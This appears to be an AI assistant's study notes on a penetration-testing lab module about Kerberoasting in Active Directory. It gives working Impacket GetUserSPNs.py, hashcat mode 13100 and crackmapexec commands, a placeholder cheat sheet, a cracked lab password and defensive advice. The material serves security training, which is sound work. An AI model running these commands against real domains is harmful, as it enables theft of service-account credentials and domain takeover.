Absolutely. I’ll keep the **important commands, terminology, attack flow, examples, and key points from the module intact**, while reorganizing them into detailed cybersecurity-mentor notes. I’ll also add visual context where it helps.

## 1. What is Kerberoasting?

**Kerberoasting** is an Active Directory attack technique used for **lateral movement and privilege escalation**.

It targets **Service Principal Name (SPN)** accounts.

An **SPN (Service Principal Name)** is a unique identifier used by Kerberos to associate a service with the domain account under which that service is running.

### Core idea

The attack works roughly like this:

```text
             Active Directory Domain
                     │
                     ▼
              Find accounts
               with SPNs
                     │
                     ▼
          Request Kerberos TGS
                     │
                     ▼
             Obtain TGS-REP
                     │
                     ▼
        Extract crackable ticket
                     │
                     ▼
          Offline password
              cracking
                     │
                     ▼
          Recover password
                     │
                     ▼
       Authenticate as service
             account
                     │
                     ▼
        Possible privilege
          escalation / Lateral
              movement
```

The important point is:

> **The TGS ticket itself does not directly give you command execution as the target account.**

Instead, the TGS-REP is encrypted using the service account's NTLM hash. If the account's password is weak enough, the ticket can potentially be cracked **offline** to recover the password.

---

## 2. Why SPNs Matter

Domain accounts are frequently used to run services because built-in accounts such as:

```text
NT AUTHORITY\LOCAL SERVICE
```

can have limitations when network authentication is required.

A service account might therefore run:

- SQL Server
    
- Backup services
    
- Monitoring systems
    
- Web applications
    
- Other enterprise services
    

The service is associated with an SPN.

For example:

```text
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

This tells Kerberos that a particular service is running under a particular account.

Any domain user can request a Kerberos ticket for a service account in the same domain, assuming normal Kerberos authentication conditions are met.

---

# 3. Why Service Accounts Are Interesting

Service accounts can have **more privileges than ordinary users**.

This happens because services may need access to:

- Multiple servers
    
- Databases
    
- File shares
    
- Enterprise applications
    
- Administrative functions
    

The module highlights that service accounts may therefore become:

```text
Service Account
      │
      ├── Local Administrator on Server A
      │
      ├── Local Administrator on Server B
      │
      └── Privileged Domain Group
```

Some service accounts can even be members of:

```text
Domain Admins
```

directly or through nested group membership.

### Why this makes Kerberoasting dangerous

Suppose:

```text
SPN → SQL Service Account
             │
             ▼
       Weak password
             │
             ▼
      Crack TGS offline
             │
             ▼
       Recover password
             │
             ▼
   SQL Service Account
             │
             ▼
   Administrative access
```

The resulting access depends heavily on the privileges assigned to that service account.

---

# 4. Important Concept: TGS-REP

Kerberos authentication involves several ticket types.

For Kerberoasting, the important one is:

**TGS-REP — Ticket Granting Service Response**

The attacker requests a service ticket for an account associated with an SPN.

The resulting ticket contains material encrypted using the service account's secret.

Conceptually:

```text
Domain User
    │
    │ Request service ticket
    ▼
Kerberos / Domain Controller
    │
    │ TGS-REP
    ▼
Attacker
    │
    │ Offline cracking
    ▼
Service Account Password
```

The key advantage for an attacker is that password cracking can happen **offline**.

---

# 5. Prerequisites

According to the module, Kerberoasting can be performed from several positions.

### Linux

You can attack from:

1. A **non-domain-joined Linux host** using valid domain credentials.
    
2. A **domain-joined Linux host** as root after retrieving a keytab.
    

### Windows

You can attack from:

3. A domain-joined Windows host authenticated as a domain user.
    
4. A domain-joined Windows host with a shell running in a domain-account context.
    
5. A domain-joined Windows host as `SYSTEM`.
    
6. A non-domain-joined Windows host using `runas /netonly`.
    

### Minimum important requirement

For the Linux technique covered here, you generally need:

```text
Valid domain credentials
        +
Domain Controller IP
        +
SPN/service account
```

The module specifically states that domain credentials can be supplied as:

- Cleartext password
    
- NT password hash
    
- Kerberos ticket
    

---

# 6. Tools Used

The module introduces several tools for Kerberoasting:

### Linux

**Impacket**

Most importantly:

```text
GetUserSPNs.py
```

### Windows

Possible tooling includes:

```text
setspn.exe
PowerShell
Mimikatz
PowerView
Rubeus
```

For this section, the focus is:

> **Linux + Impacket + GetUserSPNs.py + Hashcat**

---

# 7. Installing Impacket

The module demonstrates installing Impacket with pip:

```bash
sudo python3 -m pip install .
```

This installs the Impacket tools and places them in the PATH so they can be executed from different directories.

Then:

```bash
GetUserSPNs.py -h
```

can be used to view the help menu.

---

# 8. GetUserSPNs.py

The main tool in this section is:

```text
GetUserSPNs.py
```

Its purpose is to:

> Query the target domain for SPNs that are running under user accounts.

The module shows the general syntax:

```bash
GetUserSPNs.py [options] target
```

The target follows the format:

```text
domain/username[:password]
```

Important options include:

```text
-request
-request-user
-outputfile
-hashes
-no-pass
-k
-aesKey
-dc-ip
```

---

# 9. Step 1 — Enumerate SPNs

The first important step is **finding accounts associated with SPNs**.

Example from the module:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

You are prompted for the password.

The output provides information such as:

```text
ServicePrincipalName
Name
MemberOf
PasswordLastSet
LastLogon
Delegation
```

The module's example includes accounts such as:

```text
BACKUPAGENT
SOLARWINDSMONITOR
sqlprod
sqlqa
sqldev
adfs
```

with different SPNs and group memberships.

---

# 10. What Should You Look At?

When enumerating SPNs, don't just look for:

```text
SPN = YES
```

Look at the **associated account** and especially its privileges.

For example:

```text
SPN
 │
 ├── Account name
 │
 ├── MemberOf
 │
 ├── PasswordLastSet
 │
 └── Delegation
```

### Particularly interesting:

```text
MemberOf = Domain Admins
```

If you find an SPN associated with a highly privileged account, it deserves careful investigation in an authorized assessment.

The module specifically demonstrates several SPN accounts that are members of **Domain Admins**.

---

# 11. Step 2 — Request TGS Tickets

Once SPN accounts have been identified, the next step demonstrated by the module is requesting their TGS tickets.

Use:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

The important option is:

```text
-request
```

This requests the TGS tickets and outputs them in a format suitable for offline password-cracking tools such as:

```text
Hashcat
John the Ripper
```

---

# 12. What Does the Result Look Like?

The output contains a Kerberos hash representation similar to:

```text
$krb5tgs$23$*username$DOMAIN$...
```

For example, the module demonstrates:

```text
$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$...
```

and:

```text
$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$...
```

These are not ordinary NTLM hashes.

They represent:

```text
Kerberos 5
     │
     └── TGS-REP
```

The module notes that these tickets can be provided to Hashcat or John for offline cracking.

---

# 13. Requesting a Specific User's TGS

You don't always need to request every ticket.

You can target a specific account with:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

This requests the ticket for:

```text
sqldev
```

The module shows that `sqldev` was associated with:

```text
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

and belonged to:

```text
Domain Admins
```

### Mentor tip 🧠

When doing authorized testing, targeted requests can make your workflow cleaner:

```text
Enumerate SPNs
      ↓
Identify interesting accounts
      ↓
Request specific TGS
      ↓
Save ticket
      ↓
Offline analysis
```

---

# 14. Save the TGS to a File

The module recommends saving tickets to a file for offline cracking.

Example:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend \
-request-user sqldev \
-outputfile sqldev_tgs
```

This creates:

```text
sqldev_tgs
```

containing the TGS ticket.

---

# 15. Offline Password Cracking

Once the ticket has been obtained, it can be subjected to offline password cracking.

The module uses:

```text
Hashcat
```

with hash mode:

```text
13100
```

The demonstrated command is:

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

### Important to remember

```text
Hashcat Mode 13100
        ↓
Kerberos 5
        ↓
etype 23
        ↓
TGS-REP
```

The module's Hashcat output identifies the format as:

```text
Kerberos 5, etype 23, TGS-REP
```

---

# 16. Why Offline Cracking Works

This is one of the **most important concepts in the module**.

You aren't directly brute-forcing the Domain Controller.

Instead:

```text
Domain Controller
       │
       │ TGS
       ▼
Attacker
       │
       │ Save ticket
       ▼
Offline cracking
       │
       ▼
Password candidate
       │
       ▼
Compare against ticket
```

Therefore, the cracking process doesn't need to continuously interact with the domain controller.

This is why strong service-account passwords are particularly important.

---

# 17. Password Strength Matters

Kerberoasting does **not automatically mean compromise**.

The module emphasizes:

> Obtaining a TGS ticket does not guarantee valid credentials.

The ticket must still be cracked.

TGS tickets can also take longer to crack than formats such as NTLM hashes. If the service account has a strong password, cracking may be difficult or impossible using ordinary resources.

### Think of it like this:

```text
SPN found
   │
   ▼
TGS obtained
   │
   ▼
Can it be cracked?
   │
 ┌─┴─────────┐
NO           YES
│             │
▼             ▼
No password  Password
recovered    recovered
```

---

# 18. Module Example — Successful Crack

In the provided lab, Hashcat successfully cracked the `sqldev` ticket.

The recovered password shown in the module is:

```text
database!
```

The Hashcat output indicates:

```text
Status: Cracked
Recovered: 1/1
```

> **Important:** `database!` is a lab credential from the provided HTB material, not a password you should reuse outside the lab.

---

# 19. Step 4 — Validate the Recovered Credentials

After obtaining the password, the module validates whether the credentials actually work.

It demonstrates:

```bash
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

The result shows successful authentication:

```text
[+] INLANEFREIGHT.LOCAL\sqldev:database!
```

and the lab indicates:

```text
(Pwn3d!)
```

The module then explains that this confirmed access to the target domain controller and that the account had Domain Admin rights.

---

# 20. Complete Attack Chain

This is the **single most important diagram to memorize**:

![Image](https://images.openai.com/static-rsc-4/SaV6x1APlcyq1uomFplI65y87ih0tNuBm8t_Dj9LlATTgCI91i0RMIW8o5N0vWdfmlOp5mXifqhCTF6I58DMCC-39g4gVVWSMkzyZAg9zHNYqIQBekKhqHMWkf4tkASw_e6g8rI3xKaUAv-gVAzqIqf89uQPHQFBUA-WEHgAJmceLOpYXtlCLOIng3D7GzOb?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/HY9ktFlvy3sWMmIlMDDI8VB7FkZS3DQ8k-qqavmh_q3Di33Q0lvOKTziQ_4Hr1jBoHCawO-4fijy-JXrftS1KAT0-pIATNfx-QB6RCMGjrhL-AZiTLszLs3zGQczYrNihxvH91Xie7PZ7xZFDeOOB_fwsfr8Z6GgctGhfba2CsJad1oOqwfElwXQzWMKJs7g?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/Gbj3puue7yFGsFYyesdWOKl2Qj25IxuQ1kkGz9OOs0S96-srtoWit9qs9-3OtOcyvfuN9i3bxlyvw4X-neF5BnKI58svduMgVYxR_DSUQ7dG6qo1pE14go-cueKRcYV7jnQQQlSIWUdt1c9gsIt0OCyldCk_kI7pzvPsWQ18976qGCMrHxMA1JTmVVdbWfTW?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/CJFt-U_Kb6qqIiR3sS7wciUKUVl-TTxZXabscVMG1AM-I0e0fiZV2craiw7UQlySDt2BUxNe88c8UKgUsFWjBMObBFmSpI_y9Q5Dd1C-5rDkgPYTFCdwDWQr40yZJKl7DNOb1Hkkylm7ZXbzLSt0Nbtyj3HtLY-YgD39NF3Zv2DgT87kGLIdFeq67pdISBtz?purpose=fullsize)

```text
                 VALID DOMAIN USER
                        │
                        ▼
                Enumerate SPNs
                        │
                        ▼
                 GetUserSPNs.py
                        │
                        ▼
             Identify service accounts
                        │
                        ▼
                Request TGS ticket
                        │
                        ▼
                    TGS-REP
                        │
                        ▼
                 Save ticket/hash
                        │
                        ▼
             Offline password cracking
                        │
                        ▼
                 Password recovered
                        │
                        ▼
             Authenticate as account
                        │
                        ▼
       ┌────────────────┴────────────────┐
       ▼                                 ▼
 Lateral Movement                 Privilege Escalation
       │                                 │
       └────────────────┬────────────────┘
                        ▼
                 Further Enumeration
```

---

# 21. Important Commands — Cheat Sheet

### Install Impacket

```bash
sudo python3 -m pip install .
```

### Get help

```bash
GetUserSPNs.py -h
```

### Enumerate SPNs

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
```

### Request all TGS tickets

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request
```

### Request one user's ticket

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <TARGET_USER>
```

### Save ticket to file

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> \
-request-user <TARGET_USER> \
-outputfile <OUTPUT_FILE>
```

### Crack Kerberos TGS-REP with Hashcat

```bash
hashcat -m 13100 <TGS_FILE> <WORDLIST>
```

### Validate credentials in the lab

```bash
sudo crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>'
```

---

# 22. Understanding the `GetUserSPNs.py` Workflow

Memorize this:

```text
GetUserSPNs.py
      │
      ├── Query domain
      │
      ├── Find SPNs
      │
      ├── Identify service accounts
      │
      ├── Check privileges
      │
      ├── Request TGS
      │
      └── Export ticket
```

Then:

```text
TGS
 │
 ▼
Hashcat
 │
 ▼
Password
 │
 ▼
Authentication
```

---

# 23. Efficacy of Kerberoasting

Kerberoasting can have very different outcomes.

### Scenario A — High impact

```text
TGS
 ↓
Cracked
 ↓
Privileged account
 ↓
Significant domain access
```

### Scenario B — Limited impact

```text
TGS
 ↓
Cracked
 ↓
Low-privilege account
 ↓
Limited additional access
```

### Scenario C — No password recovered

```text
TGS
 ↓
Cracking attempts
 ↓
Strong password
 ↓
No password recovered
```

The module explains that the presence of SPNs alone does **not guarantee any particular level of access**.

---

# 24. Risk Assessment Concept

An important penetration-testing lesson here is:

> **Don't automatically assign the same severity to every Kerberoasting finding.**

The impact depends on:

- Whether the TGS can be cracked
    
- Password strength
    
- Privileges of the service account
    
- Whether the recovered account provides additional access
    
- Whether the account is highly privileged
    

The module describes situations ranging from potentially high-risk domain compromise to medium-risk findings where strong passwords prevent successful cracking.

---

# 25. Why Weak Service Account Passwords Are Dangerous

The module specifically notes that service accounts can sometimes have:

- Weak passwords
    
- Reused passwords
    
- Passwords similar to the username
    

This creates a dangerous combination:

```text
Service Account
      +
SPN
      +
Weak Password
      ↓
Kerberoasting
      ↓
Offline Cracking
      ↓
Credential Recovery
```

---

# 26. MSSQL Example

One particularly important example from the module is MSSQL.

Suppose:

```text
SPN:

MSSQL/SRV01
```

If the associated service account is compromised and has sufficient privileges, the attacker may be able to access the MSSQL service with elevated privileges.

The module gives an example where an attacker could potentially access MSSQL as `sysadmin`, enable:

```text
xp_cmdshell
```

and obtain code execution on the SQL server.

### Attack-chain concept

```text
Kerberoasting
      ↓
SQL service account password
      ↓
MSSQL authentication
      ↓
High SQL privileges
      ↓
Potential command execution
```

This demonstrates why **service-account privilege mapping is critical**.

---

# 27. Defensive Understanding 🛡️

From a defender's perspective, the attack teaches several important lessons.

### Protect service accounts

Use:

```text
Strong unique passwords
```

and avoid:

```text
Username = Password
```

or predictable/reused passwords.

### Minimize privileges

A service account should have only the privileges required for its service.

Avoid unnecessary:

```text
Domain Admins
```

membership.

### Monitor unusual Kerberos activity

Security teams should investigate unusual patterns of service-ticket requests, particularly when associated with suspicious accounts or hosts.

### Prefer managed service accounts where appropriate

Modern AD environments can use managed service-account mechanisms to reduce the burden of manually managing long-lived service-account passwords.

---

# 28. Key Terminology

|Term|Meaning|
|---|---|
|**Active Directory**|Microsoft's directory/service platform for Windows domains|
|**Kerberos**|Authentication protocol commonly used in AD|
|**SPN**|Service Principal Name; identifies a service instance|
|**TGS**|Ticket Granting Service ticket|
|**TGS-REP**|Kerberos response containing the requested service ticket|
|**Service Account**|Domain account used to run a service|
|**GetUserSPNs.py**|Impacket tool used to query SPNs and request service tickets|
|**Impacket**|Python toolkit containing numerous network/Windows protocol tools|
|**Hashcat**|Password recovery/cracking tool|
|**etype 23**|RC4-HMAC Kerberos encryption type|
|**Domain Admins**|Highly privileged AD security group|
|**MSSQLSvc**|Common SPN service class associated with Microsoft SQL Server|

---

# 29. Exam / Viva Questions

### Q1. What is Kerberoasting?

Kerberoasting is an Active Directory attack technique that targets accounts associated with SPNs by requesting TGS tickets and attempting to crack them offline to recover the service account's password.

### Q2. What does SPN stand for?

**Service Principal Name.**

### Q3. Why are SPNs important in Kerberoasting?

SPNs identify services associated with domain accounts. Accounts with SPNs can have Kerberos service tickets requested for them.

### Q4. What ticket does Kerberoasting target?

**TGS — Ticket Granting Service ticket**, specifically the TGS-REP returned by the KDC.

### Q5. Why can the TGS be cracked offline?

The service ticket contains encrypted material tied to the service account's secret, allowing password guesses to be tested without repeatedly authenticating against the domain controller.

### Q6. Which Impacket tool is used?

```text
GetUserSPNs.py
```

### Q7. What Hashcat mode does this module use?

```text
13100
```

### Q8. What is the major factor determining whether Kerberoasting succeeds?

The strength/crackability of the service account's password, along with the privileges of the account.

### Q9. Does finding an SPN automatically mean compromise?

**No.**

Finding an SPN and obtaining a TGS does not guarantee that the password can be cracked or that the account has useful privileges.

### Q10. Why are privileged service accounts especially dangerous?

Because compromising their password may provide administrative access to one or multiple systems, potentially including highly privileged domain access.

---

# 30. Mentor Memory Map 🧠

If you remember only **one thing**, remember:

```text
SPN
 │
 │ identifies
 ▼
SERVICE ACCOUNT
 │
 │ request
 ▼
TGS
 │
 │ encrypted with service-account secret
 ▼
OFFLINE CRACKING
 │
 │ if password is weak
 ▼
PASSWORD
 │
 ▼
AUTHENTICATION
 │
 ├── Lateral Movement
 │
 └── Privilege Escalation
```

### The practical methodology:

```text
1. Get domain-user access
        ↓
2. Identify Domain Controller
        ↓
3. Enumerate SPNs
        ↓
4. Identify interesting service accounts
        ↓
5. Check account privileges
        ↓
6. Request TGS
        ↓
7. Save TGS
        ↓
8. Offline crack
        ↓
9. Validate recovered credentials
        ↓
10. Continue authorized enumeration/post-exploitation
```

The module next moves from **Kerberoasting from a Linux attack host** to performing the technique from a **Windows host**, emphasizing the importance of being able to work from both operating systems during assessments.

**This is our theory section. Next, following your cybersecurity-mentor workflow, we can work through the module exercises step-by-step rather than jumping directly to the answers.**